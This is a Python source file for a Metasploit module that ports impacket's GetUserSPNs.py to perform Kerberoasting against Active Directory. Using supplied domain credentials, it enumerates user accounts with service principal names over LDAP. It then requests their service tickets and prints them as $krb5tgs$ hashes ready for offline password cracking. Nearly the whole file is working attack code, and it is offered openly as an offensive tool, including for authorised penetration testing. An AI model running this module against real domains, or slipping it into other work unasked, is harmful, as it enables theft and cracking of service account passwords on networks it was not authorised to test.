#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# modules
dependencies_missing = False
try:
    import sys
    from datetime import datetime
    from binascii import hexlify, unhexlify

    from pyasn1.codec.der import decoder
    from impacket import version
    from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
        UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
    from impacket.examples import logger
    from impacket.examples.utils import parse_credentials
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.ldap import ldap, ldapasn1
    from impacket.smbconnection import SMBConnection, SessionError
    from impacket.ntlm import compute_lmhash, compute_nthash
except ImportError:
    dependencies_missing = True

from metasploit import module

metadata = {
    'name': 'Gather Ticket Granting Service (TGS) tickets for User Service Principal Names (SPN)',
    'description': '''
        This module will try to find Service Principal Names that are associated with normal user accounts.
        Since normal accounts' passwords tend to be shorter than machine accounts, and knowing that a TGS request
        will encrypt the ticket with the account the SPN is running under, this could be used for an offline
        bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
        This is part of the kerberoast attack research by Tim Medin (@timmedin).
    ''',
    'authors': [
        'Alberto Solino', # impacket example
        'Jacob Robles'    # Metasploit module conversion
    ],
    'date': '2014-09-27',
    'license': 'CORE_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py'},
        {'type': 'url', 'ref': 'https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf'}
    ],
    'type': 'single_scanner',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'domain': {'type': 'string', 'description': 'The target Active Directory domain', 'required': True, 'default': None},
        'user': {'type': 'string', 'description': 'Username for a domain account', 'required': True, 'default': None},
        'pass': {'type': 'string', 'description': 'Password for the domain user account', 'required': True, 'default': None}
    },
    'notes': {
        'AKA': [
            'GetUserSPNs.py',
            'Kerberoast'
        ]
    }}

class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        module.log('{}'.format(outputFormat.format(*header)), level='good')
        module.log('{}'.format('  '.join(['-' * itemLen for itemLen in colLen])), level='good')

        # And now the rows
        for row in items:
            module.log('{}'.format(outputFormat.format(*row)), level='good')

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__target = None
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = None  #options.outputfile
        self.__usersFile = None       #cmdLineOptions.usersfile
        self.__aesKey = None          #cmdLineOptions.aesKey
        self.__doKerberos = False     #cmdLineOptions.k
        self.__requestTGS = True     #cmdLineOptions.request
        # [!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
        self.__kdcIP = cmdLineOptions['dc_ip'] # cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions['dc_ip'] #cmdLineOptions.dc_host
        self.__saveTGS = False        #cmdLineOptions.save
        self.__requestUser = None #cmdLineOptions.request_user
        #if cmdLineOptions.hashes is not None:
        #    self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]
        # We can't set the KDC to a custom IP or Hostname when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != self.__targetDomain and (self.__kdcIP or self.__kdcHost):
            module.log('KDC IP address and hostname will be ignored because of cross-domain targeting.', level='error')
            self.__kdcIP = None
            self.__kdcHost = None

    def getMachineName(self, target):
        try:
            s = SMBConnection(target, target)
            s.login('', '')
        except OSError as e:
            if str(e).find('timed out') > 0:
                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except SessionError as e:
            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % target)
        else:
            s.logoff()
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                        compute_lmhash(self.__password),
                                                                        compute_nthash(self.__password), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)
            except Exception as e:
                module.log('TGT: %s' % str(e), level='error')
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                        unhexlify(self.__lmhash),
                                                                        unhexlify(self.__nthash), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcIP)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                module.log('{}'.format(entry), level='good')
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                module.log('{}'.format(entry), level='good')
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                module.log('{}'.format(entry), level='good')
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                module.log('{}'.format(entry), level='good')
            else:
                fd.write(entry + '\n')
        else:
            module.log('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']), level='debug')

        if self.__saveTGS is True:
            # Save the ticket
            module.log('About to save TGS for %s' % username, level='debug')
            ccache = CCache()
            try:
                ccache.fromTGS(tgs, oldSessionKey, sessionKey)
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                module.log(str(e), level='error')

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            self.__target = self.__kdcHost
        else:
            if self.__kdcIP is not None and self.__targetDomain == self.__domain:
                self.__target = self.__kdcIP
            else:
                self.__target = self.__targetDomain

            if self.__doKerberos:
                module.log('Getting machine hostname', level='info')
                self.__target = self.getMachineName(self.__target)

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                             self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcIP)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                 self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcIP)
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    module.log("NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
                                                                    "authentication instead.", level='error')
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        module.log("If the credentials are valid, check the hostname and IP address of KDC. They "
                                                                            "must match exactly each other", level='error')
                raise

        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"

        if self.__requestUser is not None:
            searchFilter += '(sAMAccountName:=%s))' % self.__requestUser
        else:
            searchFilter += ')'

        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=100000)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                module.log('sizeLimitExceeded exception caught, giving up and processing the data received', level='debug')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                raise

        answers = []
        module.log('Total of records returned %d' % len(resp), level='debug')

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        module.log('Bypassing disabled account %s ' % sAMAccountName, level='debug')
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                module.log('Skipping item, cannot process due to error %s' % str(e), level='error')
                pass

        if len(answers) > 0:
            self.printTable(answers, header=["ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon",
                                             "Delegation"])

            if self.__requestTGS is True or self.__requestUser is not None:
                # Let's get unique user names and a SPN to request a TGS for
                users = dict((vals[1], vals[0]) for vals in answers)

                # Get a TGT for the current user
                TGT = self.getTGT()

                if self.__outputFileName is not None:
                    fd = open(self.__outputFileName, 'w+')
                else:
                    fd = None

                for user, SPN in users.items():
                    sAMAccountName = user
                    downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName

                    try:
                        principalName = Principal()
                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                        principalName.components = [downLevelLogonName]

                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                self.__kdcHost,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
                        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                       self.__targetDomain + "/" + sAMAccountName, fd)
                    except Exception as e:
                        module.log('SPN Exception: {} - {}'.format(SPN, str(e)), level='error')

                if fd is not None:
                    fd.close()

        else:
            module.log('No entries found!', level='info')

    def request_users_file_TGSs(self):

        with open(self.__usersFile) as fi:
            usernames = [line.strip() for line in fi]

        self.request_multiple_TGSs(usernames)

    def request_multiple_TGSs(self, usernames):
        # Get a TGT for the current user
        TGT = self.getTGT()

        if self.__outputFileName is not None:
            fd = open(self.__outputFileName, 'w+')
        else:
            fd = None

        for username in usernames:
            try:
                principalName = Principal()
                principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                principalName.components = [username]

                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                        self.__kdcHost,
                                                                        TGT['KDC_REP'], TGT['cipher'],
                                                                        TGT['sessionKey'])
                self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
            except Exception as e:
                module.log('User Exception: {} - {}'.format(username, str(e)), level='error')

        if fd is not None:
            fd.close()

def run(args):
    if dependencies_missing:
        module.log('Module dependencies (impacket, pyasn1, pyOpenSSL) missing, cannot continue', level='error')
        return

    options = {}
    options['dc_ip'] = args['rhost']
    user_domain = args['domain']
    target_domain = args['domain']
    executer = GetUserSPNs(args['user'], args['pass'], user_domain, target_domain, options)
    executer.run()

if __name__ == '__main__':
    module.run(metadata, run)
